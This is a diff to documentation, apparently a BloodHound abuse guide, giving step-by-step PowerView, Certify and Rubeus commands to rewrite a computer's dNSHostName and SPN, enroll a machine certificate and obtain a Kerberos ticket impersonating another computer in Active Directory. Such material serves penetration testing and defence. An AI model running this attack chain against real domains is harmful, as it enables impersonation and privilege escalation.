@@ -21,7 +21,7 @@ The SPNs of the victim will be automatically updated when you change the `dNSHos
 
 Set SPN of the victim computer using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}
 ```
 
@@ -29,7 +29,7 @@ Step 2: Set `dNSHostName` of victim computer to targeted computer's `dNSHostName
 
 Set the `dNSHostName` of the victim computer using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='target.corp.local'}
 ```
 Step 3: Check if the 'mail' attribute of victim must be set and set it if required.
@@ -45,7 +45,7 @@ principal why it can be set to any arbitrary string.
 
 Check if the victim has the mail attribute set using PowerView:
 
-```bash
+```PowerShell
 Get-DomainObject -Identity VICTIM -Properties mail
 ```
 
@@ -53,7 +53,7 @@ If the victim has the mail attribute set, continue to Step 4.
 
 If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}
 ```
 Step 4: Obtain a session as victim.
@@ -62,36 +62,30 @@ There are several options for this step. You can obtain a session as SYSTEM on t
 
 Step 5: Enroll certificate as victim.
 
-Use Certify as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:
+Use Certify (2.0) as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:
 
-```bash
-Certify.exe request /ca:SERVERCA-NAME /template:TEMPLATE /machine
+```cmd
+Certify.exe request --ca SERVER\CA-NAME --template TEMPLATE --machine
 ```
-Save the certificate as `cert.pem` and the private key as `cert.key`.
+The certificate PFX is printed to the console in a base64-encoded format.
 
-Step 6: Convert the emitted certificate to PFX format:
-
-```bash
-certutil.exe -MergePFX .\cert.pem .\cert.pfx
-```
-Step 7 (optional): Set `dNSHostName` and SPN of victim to the previous values.
+Step 6 (optional): Set `dNSHostName` and SPN of victim to the previous values.
 
 To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to its previous values using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}
 ```
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}
 ```
 
-Step 8: Perform Kerberos authentication as targeted computer against affected DC using certificate.
+Step 7: Perform Kerberos authentication as targeted computer against affected DC using certificate.
 
-Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the
-target identity to impersonate and the PFX-formatted certificate created in Step 6:
+Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the target identity to impersonate and the base64-encoded certificate obtained in Step 5:
 
-```bash
-Rubeus.exe asktgt /certificate:cert.pfx /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER
+```cmd
+Rubeus.exe asktgt /certificate:<cert base64> /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER
 ```
 
 ### Linux
@@ -181,10 +175,9 @@ This edge is related to the following MITRE ATT&CK tactic and techniques:
 
 * Certipy 4.0
 * [Certipy](https://github.com/ly4k/Certipy)
-* [GhostPack Certipy](https://github.com/GhostPack/Certify)
+* [GhostPack Certify](https://github.com/GhostPack/Certify)
 * [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
 * [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject)
-* [CertUtil.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
 * [LDAPSearch](https://linux.die.net/man/1/ldapsearch)
 * [LDAPModify](https://linux.die.net/man/1/ldapmodify)
 * [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
